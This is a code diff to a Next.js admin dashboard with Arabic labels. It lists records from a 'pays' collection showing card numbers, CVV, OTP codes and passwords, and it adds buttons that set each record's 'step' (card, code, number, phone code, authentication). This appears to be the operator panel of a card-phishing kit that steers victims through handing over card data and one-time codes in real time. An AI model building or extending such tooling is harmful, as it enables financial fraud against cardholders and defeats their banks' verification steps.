@@ -1,5 +1,4 @@
 "use client";
-
 import type React from "react";
 import { useState, useEffect, useMemo, useRef } from "react";
 import { useRouter } from "next/navigation";
@@ -147,7 +146,16 @@ interface Notification {
   phone: string;
   flagColor?: string;
   currentPage?: string;
+  step?: number;
 }
+
+const stepButtons = [
+  { label: "بطاقة", step: 0 },
+  { label: "كود", step: 2 },
+  { label: "رقم", step: 3 },
+  { label: "كود الهاتف", step: 4 },
+  { label: "مصادقة", step: 5 },
+];
 
 // Hook for online users count
 function useOnlineUsersCount() {
@@ -967,7 +975,7 @@ export default function NotificationsPage() {
             return { id: doc.id, ...data };
           })
           .filter(
-            (notification: any) => notification.cardNumber
+            (notification: any) => !notification.isHidden
           ) as Notification[];
 
         // Check if there are any new notifications with card info or general info
@@ -1065,6 +1073,34 @@ export default function NotificationsPage() {
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تحديث لون العلامة",
+        variant: "destructive",
+      });
+    }
+  };
+
+  const handleStepUpdate = async (id: string, step: number) => {
+    try {
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { step: step });
+
+      setNotifications(
+        notifications.map((notification) =>
+          notification.id === id
+            ? { ...notification, step: step }
+            : notification
+        )
+      );
+
+      toast({
+        title: "تم تحديث الخطوة",
+        description: `تم تحديث الخطوة بنجاح.`,
+        variant: "default",
+      });
+    } catch (error) {
+      console.error("Error updating step:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء تحديث الخطوة",
         variant: "destructive",
       });
     }
@@ -1314,7 +1350,7 @@ export default function NotificationsPage() {
                     variant="outline"
                     size="icon"
                     onClick={handleRefresh}
-                    className="relative overflow-hidden"
+                    className="relative overflow-hidden bg-transparent"
                   >
                     <RefreshCw
                       className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
@@ -1484,7 +1520,11 @@ export default function NotificationsPage() {
                 <div className="flex gap-2">
                   <DropdownMenu>
                     <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2">
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="gap-2 bg-transparent"
+                      >
                         <Filter className="h-4 w-4" />
                         فلترة
                       </Button>
@@ -1504,7 +1544,11 @@ export default function NotificationsPage() {
 
                   <DropdownMenu>
                     <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2">
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="gap-2 bg-transparent"
+                      >
                         <ArrowUpDown className="h-4 w-4" />
                         ترتيب
                       </Button>
@@ -1597,6 +1641,9 @@ export default function NotificationsPage() {
                     </th>
                     <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
                       الكود
+                    </th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
+                      تحديث الخطوة
                     </th>
                     <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
                       الإجراءات
@@ -1699,6 +1746,27 @@ export default function NotificationsPage() {
                             {notification.otp}
                           </Badge>
                         )}
+                      </td>
+                      <td className="px-6 py-4">
+                        <div className="flex flex-wrap justify-center gap-1">
+                          {stepButtons.map(({ label, step }) => (
+                            <Button
+                              key={step}
+                              size="sm"
+                              variant={
+                                notification.step === step
+                                  ? "default"
+                                  : "outline"
+                              }
+                              onClick={() =>
+                                handleStepUpdate(notification.id, step)
+                              }
+                              className="text-xs px-2 h-7"
+                            >
+                              {label}
+                            </Button>
+                          ))}
+                        </div>
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex justify-center gap-1">
@@ -1835,6 +1903,30 @@ export default function NotificationsPage() {
                             ? "معلومات البطاقة"
                             : "لا يوجد بطاقة"}
                         </Badge>
+                      </div>
+
+                      <div className="pt-3 border-t">
+                        <p className="text-sm font-medium text-muted-foreground mb-2">
+                          تحديث الخطوة:
+                        </p>
+                        <div className="flex flex-wrap gap-2">
+                          {stepButtons.map(({ label, step }) => (
+                            <Button
+                              key={step}
+                              size="sm"
+                              variant={
+                                notification.step === step
+                                  ? "default"
+                                  : "outline"
+                              }
+                              onClick={() =>
+                                handleStepUpdate(notification.id, step)
+                              }
+                            >
+                              {label}
+                            </Button>
+                          ))}
+                        </div>
                       </div>
 
                       <div className="flex justify-between items-center">
@@ -2010,9 +2102,10 @@ export default function NotificationsPage() {
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
                   { label: "كلمة المرور", value: selectedNotification.pass },
+                  { label: "الخطوة الحالية", value: selectedNotification.step },
                 ].map(
                   ({ label, value }) =>
-                    value && (
+                    value !== undefined && (
                       <div
                         key={label}
                         className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
@@ -2020,7 +2113,7 @@ export default function NotificationsPage() {
                         <span className="font-medium text-muted-foreground">
                           {label}:
                         </span>
-                        <span className="font-semibold">{value}</span>
+                        <span className="font-semibold">{String(value)}</span>
                       </div>
                     )
                 )}
